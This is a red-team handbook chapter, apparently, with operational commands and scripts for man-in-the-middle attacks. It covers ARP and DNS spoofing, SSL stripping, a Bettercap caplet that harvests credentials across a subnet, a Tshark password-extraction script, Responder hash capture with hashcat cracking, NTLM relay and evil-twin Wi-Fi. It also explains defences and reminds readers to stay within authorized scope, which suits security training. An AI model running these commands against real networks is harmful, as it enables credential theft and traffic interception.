# Chapter 14: Man-in-the-Middle Frameworks

Network attacks represent a crucial component of the red team arsenal, allowing security professionals to intercept, analyze, and manipulate network traffic. This chapter explores sophisticated tools designed to execute Man-in-the-Middle (MITM) attacks that can reveal sensitive information traveling across networks and demonstrate the risks of inadequate encryption or network segmentation.

## Introduction to Man-in-the-Middle Attacks

Man-in-the-Middle attacks involve positioning yourself between a client and server to intercept their communications. In red team operations, MITM attacks serve several important purposes:

- **Credential harvesting**: Capturing usernames and passwords sent over unencrypted connections
- **Information gathering**: Identifying internal resources, services, and data flows
- **Access expansion**: Using captured credentials to access additional systems
- **Testing encryption**: Verifying the proper implementation of TLS/SSL
- **Protocol analysis**: Identifying vulnerabilities in custom protocols

This chapter explores four powerful frameworks that facilitate different aspects of network interception and analysis, from active MITM attacks to passive traffic monitoring and credential capturing.

## Ettercap: MITM Attacks

Ettercap is a comprehensive suite for man-in-the-middle attacks, offering capabilities for network discovery, connection manipulation, and content filtering. It's particularly effective in switched networks where traditional sniffing is challenging.

### Installation

Ettercap is typically pre-installed on security-focused Linux distributions like Kali and Parrot OS. If needed, you can install it:

```bash
# On Debian/Ubuntu-based systems
sudo apt update
sudo apt install ettercap-graphical

# On Arch-based systems
sudo pacman -S ettercap

# On Fedora
sudo dnf install ettercap
```

### Basic Usage

Ettercap offers both text and graphical interfaces. The text-based interface is preferred for scripting and automation:

```bash
# Start Ettercap in text mode
ettercap -T -q -i eth0

# Scan for hosts on the network
ettercap -T -q -i eth0 -M arp // // -P autoadd

# Target specific hosts (MITM between 192.168.1.5 and 192.168.1.1)
ettercap -T -q -i eth0 -M arp /192.168.1.5/ /192.168.1.1/
```

For beginners, the graphical interface provides an easier entry point:

```bash
# Start Ettercap in graphical mode
ettercap -G
```

### ARP Poisoning

ARP poisoning (or ARP spoofing) is the fundamental technique behind many MITM attacks. It involves sending falsified ARP messages to associate your MAC address with the IP address of another host (typically the default gateway):

```bash
# Simple ARP poisoning between target and gateway
ettercap -T -q -i eth0 -M arp:remote /192.168.1.5/ /192.168.1.1/

# ARP poisoning with packet filtering
ettercap -T -q -i eth0 -M arp:remote /192.168.1.5/ /192.168.1.1/ -F filter.ef
```

ARP poisoning works because:
1. ARP has no authentication mechanism
2. Most systems accept unsolicited ARP replies ("gratuitous ARP")
3. New ARP information overwrites existing cache entries

### Custom Filters

One of Ettercap's most powerful features is its filtering engine, which allows you to modify packets in transit. Filters are written in a C-like language:

1. Create a filter file (e.g., `replace_image.filter`):

```
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "GET ")) {
        replace("Accept-Encoding: gzip", "Accept-Encoding: ");
        msg("Modified request headers\n");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "Content-Type: image")) {
        replace("HTTP/1.1 200 OK", "HTTP/1.1 302 Found\r\nLocation: http://evil.com/fake.jpg");
        msg("Replaced image response\n");
    }
}
```

2. Compile the filter:

```bash
etterfilter replace_image.filter -o replace_image.ef
```

3. Use the filter with Ettercap:

```bash
ettercap -T -q -i eth0 -M arp:remote /192.168.1.5/ /192.168.1.1/ -F replace_image.ef
```

### Example: SSL Stripping Attack

SSL stripping downgrades HTTPS connections to HTTP, allowing an attacker to intercept traffic that would otherwise be encrypted. Here's how to perform an SSL stripping attack with Ettercap:

1. Enable IP forwarding:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

2. Set up iptables to redirect HTTPS traffic to the SSLstrip tool:

```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

3. Start SSLstrip:

```bash
sslstrip -l 8080
```

4. Launch Ettercap to perform ARP poisoning:

```bash
ettercap -T -q -i eth0 -M arp:remote /192.168.1.5/ /192.168.1.1/
```

5. Monitor captured credentials:

```bash
tail -f sslstrip.log
```

This attack exploits the fact that many users:
- Initially connect to websites via HTTP before being redirected to HTTPS
- Don't notice when the expected HTTPS connection is downgraded to HTTP
- Enter credentials even when security indicators (padlock icon) are absent

Modern defenses like HTTP Strict Transport Security (HSTS) and browser warnings have reduced the effectiveness of basic SSL stripping, but many internal applications and less popular websites remain vulnerable.

## Bettercap: Network Attack Toolkit

Bettercap is a modern, powerful, and easily extensible MITM framework that has largely replaced Ettercap in many scenarios. It offers a modular architecture with a wide range of capabilities beyond basic ARP spoofing.

### Installation

```bash
# On Kali Linux
sudo apt update
sudo apt install bettercap

# From source
sudo apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
go get github.com/bettercap/bettercap
```

### Basic Usage

Bettercap uses a modular approach with a variety of "caplets" (script files) for different scenarios:

```bash
# Start bettercap
sudo bettercap -iface eth0

# In the bettercap shell:
# Discover hosts on the network
net.probe on

# List discovered hosts
net.show

# Basic ARP spoofing
set arp.spoof.targets 192.168.1.5
arp.spoof on
```

### Module Usage

Bettercap's strength lies in its modules, which provide specific functionalities:

#### 1. Network Reconnaissance

```bash
# Enable network discovery
net.probe on

# Enable sniffing
set net.sniff.verbose true
net.sniff on
```

#### 2. ARP Spoofing

```bash
# Target specific hosts (or use empty string for all)
set arp.spoof.targets 192.168.1.5,192.168.1.10
set arp.spoof.internal true
arp.spoof on
```

#### 3. DNS Spoofing

```bash
# Redirect specific domains
set dns.spoof.domains example.com,*.example.org
set dns.spoof.address 192.168.1.100
dns.spoof on
```

#### 4. HTTP/HTTPS Proxying

```bash
# Set up HTTP proxy
set http.proxy.port 8080
http.proxy on

# Enable HTTP request/response dumping
http.proxy.script /path/to/dump.js
```

#### 5. Web UI for Monitoring

```bash
# Start the web UI
ui.update
set http.server.address 0.0.0.0
set http.server.port 8081
http.server on
```

### Example: Automated Credential Harvesting

This example demonstrates using Bettercap to automatically harvest credentials from HTTP, HTTPS, and other protocols:

1. Create a custom caplet file (`creds.cap`):

```
# Enable network discovery
net.probe on

# Setup ARP spoofing for the entire network
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.internal true
arp.spoof on

# Enable HTTPS proxy with certificate spoofing
set https.proxy.port 8443
set https.proxy.certificate /path/to/cert.pem
set https.proxy.key /path/to/key.pem
https.proxy on

# Enable logging of credentials
set http.proxy.port 8080
http.proxy on
set http.proxy.script /usr/share/bettercap/caplets/http-req-dump.js

# Enable logging of all network traffic
set net.sniff.local true
set net.sniff.output /tmp/network_traffic.pcap
set net.sniff.verbose true
net.sniff on

# Capture FTP, IMAP, SMTP, and Telnet credentials
set events.stream.output /tmp/credentials.log
events.stream on

# Filter for keywords
set events.stream.filter *password*,*credential*,*login*,*username*
```

2. Run the caplet:

```bash
sudo bettercap -iface eth0 -caplet creds.cap
```

3. Monitor captured credentials:

```bash
tail -f /tmp/credentials.log
```

This approach effectively captures credentials because:
- It combines multiple attack vectors simultaneously
- It targets both encrypted and unencrypted protocols
- It uses real-time filtering to highlight potential credential submissions
- It preserves full packet captures for later analysis

Modern protections like HSTS and certificate pinning have made credential harvesting more challenging, but many applications still have implementation flaws that can be exploited.

## Wireshark/Tshark: Traffic Analysis

Wireshark is the industry-standard network protocol analyzer, while Tshark is its command-line counterpart. Both are essential tools for analyzing captured traffic or performing real-time packet analysis.

### Installation

```bash
# On Debian/Ubuntu-based systems
sudo apt update
sudo apt install wireshark tshark

# On Arch-based systems
sudo pacman -S wireshark-qt

# On Fedora
sudo dnf install wireshark
```

### Basic Usage

#### Wireshark (GUI)

```bash
# Launch Wireshark
sudo wireshark

# Capture with specific interface
sudo wireshark -i eth0

# Open a pcap file
wireshark /path/to/capture.pcap
```

#### Tshark (CLI)

```bash
# Basic capture
sudo tshark -i eth0

# Save capture to file
sudo tshark -i eth0 -w /tmp/capture.pcap

# Read from file
tshark -r /tmp/capture.pcap

# Limit packet count
sudo tshark -i eth0 -c 1000
```

### Capture Filters

Capture filters use Berkeley Packet Filter (BPF) syntax to select which packets are captured, reducing file size and system load:

```bash
# Capture only HTTP traffic
sudo tshark -i eth0 -f "tcp port 80" -w http_only.pcap

# Capture traffic for a specific host
sudo tshark -i eth0 -f "host 192.168.1.5" -w host_traffic.pcap

# Capture DNS traffic
sudo tshark -i eth0 -f "udp port 53" -w dns_traffic.pcap

# Capture non-encrypted web traffic (HTTP and unencrypted SMTP)
sudo tshark -i eth0 -f "tcp port 80 or tcp port 25" -w cleartext_web.pcap
```

### Display Filters

Display filters use Wireshark's powerful filtering language to analyze already-captured packets:

```bash
# Show only HTTP traffic
tshark -r capture.pcap -Y "http"

# Show only traffic for a specific host
tshark -r capture.pcap -Y "ip.addr == 192.168.1.5"

# Show HTTP POST requests
tshark -r capture.pcap -Y "http.request.method == POST"

# Show failed authentication attempts
tshark -r capture.pcap -Y "http.response.code == 401"

# Extract usernames and passwords from basic auth
tshark -r capture.pcap -Y "http.authbasic" -T fields -e http.authbasic
```

### Example: Extracting Credentials from Unencrypted Protocols

This example demonstrates extracting various types of credentials from a packet capture:

1. Capture network traffic during a busy period:

```bash
# Capture all traffic for 1 hour
sudo tshark -i eth0 -a duration:3600 -w network_capture.pcap
```

2. Extract HTTP basic authentication credentials:

```bash
tshark -r network_capture.pcap -Y "http.authorization" -T fields -e http.authorization
```

3. Extract form-based authentication attempts:

```bash
tshark -r network_capture.pcap -Y "http.request.method == \"POST\" && http.request.uri contains \"login\"" -T fields -e frame.time -e ip.src -e http.host -e http.request.uri -e data-text-lines
```

4. Extract FTP credentials:

```bash
tshark -r network_capture.pcap -Y "ftp.request.command == \"USER\" || ftp.request.command == \"PASS\"" -T fields -e frame.time -e ip.src -e ftp.request.command -e ftp.request.arg
```

5. Extract SMTP authentication:

```bash
tshark -r network_capture.pcap -Y "smtp.auth.username or smtp.auth.password" -T fields -e frame.time -e ip.src -e smtp.auth.username -e smtp.auth.password
```

6. Extract Telnet/SSH keystrokes:

```bash
tshark -r network_capture.pcap -Y "telnet.data or ssh.key" -T fields -e telnet.data -e ssh.key
```

7. Create a script to automatically extract all credentials:

```bash
#!/bin/bash

PCAP_FILE=$1
OUTPUT_DIR="extracted_creds_$(date +%Y%m%d)"

mkdir -p $OUTPUT_DIR

echo "[+] Extracting HTTP Basic Authentication..."
tshark -r $PCAP_FILE -Y "http.authorization" -T fields -e frame.time -e ip.src -e http.host -e http.authorization > $OUTPUT_DIR/http_basic_auth.txt

echo "[+] Extracting HTTP POST login attempts..."
tshark -r $PCAP_FILE -Y "http.request.method == \"POST\" && (http.request.uri contains \"login\" || http.request.uri contains \"auth\" || http.request.uri contains \"signin\")" -T fields -e frame.time -e ip.src -e http.host -e http.request.uri -e data-text-lines > $OUTPUT_DIR/http_post_auth.txt

echo "[+] Extracting FTP credentials..."
tshark -r $PCAP_FILE -Y "ftp.request.command == \"USER\" || ftp.request.command == \"PASS\"" -T fields -e frame.time -e ip.src -e ftp.request.command -e ftp.request.arg > $OUTPUT_DIR/ftp_creds.txt

echo "[+] Extracting SMTP authentication..."
tshark -r $PCAP_FILE -Y "smtp.auth.username or smtp.auth.password" -T fields -e frame.time -e ip.src -e smtp.auth.username -e smtp.auth.password > $OUTPUT_DIR/smtp_auth.txt

echo "[+] Extracting IMAP/POP3 authentication..."
tshark -r $PCAP_FILE -Y "imap.request contains \"LOGIN\" || pop.request contains \"USER\" || pop.request contains \"PASS\"" -T fields -e frame.time -e ip.src -e data-text-lines > $OUTPUT_DIR/mail_auth.txt

echo "[+] Extracting Telnet/SSH data..."
tshark -r $PCAP_FILE -Y "telnet.data or ssh.key" -T fields -e frame.time -e ip.src -e data-text-lines > $OUTPUT_DIR/telnet_ssh_data.txt

echo "[+] Extracting cleartext passwords..."
tshark -r $PCAP_FILE -Y "frame contains \"password\" or frame contains \"passwd\" or frame contains \"username\" or frame contains \"login\" or frame contains \"credentials\"" -T fields -e frame.time -e ip.src -e data-text-lines > $OUTPUT_DIR/cleartext_passwords.txt

echo "[+] Credentials extracted to $OUTPUT_DIR"
```

This approach is effective because:
- It systematically extracts credentials from multiple protocols
- It preserves contextual information (timestamps, source IPs)
- It works with already-captured traffic, enabling offline analysis
- It can identify credentials in custom applications

Despite the rise in encryption, many internal networks and legacy systems still transmit credentials in cleartext or use weak encryption that can be decrypted after capture.

## Responder: LLMNR/NBT-NS/MDNS Poisoning

Responder is a powerful tool designed to respond to specific network requests, allowing you to harvest credentials through LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and multicast DNS poisoning.

### Installation

```bash
# On Kali Linux (pre-installed)
sudo apt update
sudo apt install responder

# From source
git clone https://github.com/lgandx/Responder
cd Responder
```

### Basic Usage

```bash
# Start Responder on the specified interface
sudo responder -I eth0

# Start with specific features enabled
sudo responder -I eth0 -wrf

# Start in analyze mode (passive)
sudo responder -I eth0 -A
```

### Configuration Options

Responder's behavior can be customized through its configuration file (`Responder.conf`):

```bash
# Edit the configuration file
nano /usr/share/responder/Responder.conf

# Key settings to consider:
# - Challenge: The NTLM challenge to send (change for unique hash formats)
# - SMB, HTTP, HTTPS: Enable/disable specific servers
# - SQL: Enable/disable the SQL server
# - FTP, POP, IMAP, SMTP: Enable/disable email-related servers
```

Important configuration options include:

#### 1. Server Enablement

```
[Responder Core]

; Enable or disable servers
SQL = On
SMB = On
HTTP = On
HTTPS = On
LDAP = On
...
```

#### 2. Protocol Poisoning

```
[Responder Core]

; Enable NBT-NS, LLMNR, and/or MDNS poisoning
; Set to Off to disable
NBT = On
LLMNR = On
MDNS = On
```

#### 3. Advanced Options

```
[Responder Core]

; Force WPAD authentication
WPAD = On

; Fingerprint hosts that trigger Responder
Fingerprint = On
```

### Example: Capturing NTLMv2 Hashes

This example demonstrates using Responder to capture NTLMv2 authentication hashes in a corporate environment:

1. Position yourself on the target network:

```bash
# Connect to the target network
# Ensure your interface is properly configured
ip addr show
```

2. Configure Responder for maximum stealth:

```bash
# Edit Responder.conf to enable only necessary servers
sudo nano /usr/share/responder/Responder.conf

# Set these values:
SMB = On
HTTP = On
HTTPS = Off  # Often blocked by AV
LDAP = Off   # Can cause network issues
SQL = Off    # Not commonly triggered
FTP = Off    # Uncommon in modern environments
```

3. Start Responder in its standard poisoning mode:

```bash
sudo responder -I eth0 -v
```

4. Monitor captured hashes:

```bash
# Hashes are stored in the logs directory
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.5.txt
```

5. Create a more targeted attack by combining with network scanning:

```bash
# Identify potential targets
sudo nmap -sP 192.168.1.0/24

# Run Responder while creating traffic that might trigger name resolution
sudo responder -I eth0 -v &

# Create non-existent share access attempts to trigger LLMNR/NBT-NS
for ip in $(seq 5 254); do
    ping -c 1 -W 1 192.168.1.$ip > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Attempting to trigger name resolution on 192.168.1.$ip"
        smbclient -L \\NONEXISTENT-SERVER-NAME -I 192.168.1.$ip -N > /dev/null 2>&1
    fi
done
```

6. Crack the captured hashes:

```bash
# Format the hashes for hashcat
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > captured_hashes.txt

# Crack with hashcat
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
```

This attack is effective because:
- Most Windows networks still use LLMNR and NBT-NS for name resolution
- These protocols are enabled by default and fall back to broadcast queries
- The authentication uses a challenge-response method that exposes password hashes
- Most users aren't aware when their system is attempting to authenticate

Defenses against Responder attacks include:
- Disabling LLMNR and NBT-NS at the domain level
- Implementing Network Access Control (NAC)
- Using network segmentation and proper DNS configuration
- Deploying monitoring to detect poisoning attacks

## Advanced MITM Techniques

Beyond the tools covered above, consider these additional MITM techniques for red team operations:

### 1. IPv6 MITM with mitm6

```bash
# Install mitm6
git clone https://github.com/fox-it/mitm6.git
cd mitm6
pip install -e .

# Run a basic attack
sudo mitm6 -d company.local

# Combine with ntlmrelayx for relay attacks
sudo ntlmrelayx.py -6 -t ldaps://dc01.company.local -wh fakewpad.company.local -l loot
```

This technique exploits Windows' preference for IPv6 over IPv4, even in IPv4-only networks.

### 2. Evil Twin Access Points

```bash
# Create a rogue access point
sudo airmon-ng start wlan0
sudo airbase-ng -e "Corporate WiFi" -c 1 wlan0mon

# Set up DHCP
sudo dhcpd -cf /etc/dhcp/dhcpd.conf at0

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

This attack creates a fake WiFi network that victims may connect to, allowing full traffic interception.

### 3. ARP Cache Poisoning Prevention Detection

```bash
# Use arpwatch to detect ARP spoofing
sudo apt install arpwatch
sudo arpwatch -i eth0
```

Understanding detection methods helps you avoid them or identify when your attack has been discovered.

## Conclusion

Man-in-the-Middle frameworks provide red teams with powerful capabilities for intercepting network traffic, harvesting credentials, and demonstrating the risks of inadequate encryption or network segmentation. The tools covered in this chapter represent different approaches to MITM attacks, from active interception with Ettercap and Bettercap to passive monitoring with Wireshark and targeted credential harvesting with Responder.

Remember that as a professional red teamer, your objective is to help organizations identify and address their security weaknesses. Always operate within the scope of your engagement and with proper authorization.

In the next chapter, we'll explore wireless attacks, focusing on tools and techniques for compromising WiFi networks and devices.
